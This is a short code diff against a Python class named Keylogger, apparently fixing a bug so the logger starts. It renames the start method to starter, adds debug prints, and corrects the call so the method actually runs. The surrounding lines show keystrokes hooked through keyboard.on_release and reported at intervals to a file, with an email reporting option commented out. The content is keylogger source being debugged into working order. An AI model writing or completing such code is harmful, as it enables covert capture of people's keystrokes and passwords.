@@ -52,15 +52,17 @@ class Keylogger:
         timer.daemon = True
         timer.start()
 
-    def start(self):
+    def starter(self):
         self.start = datetime.now()
         keyboard.on_release(callback = self.callback)
         self.report()
+        print(3)
         keyboard.wait()
+        print(4)
 
 if __name__ == "__main__":
     #keylogger = Keylogger(interval = report_interval, report_method = "email")
     keylogger = Keylogger(interval = report_interval, report_method = "file")
     print(1)
-    keylogger.start
+    keylogger.starter()
     print(2)
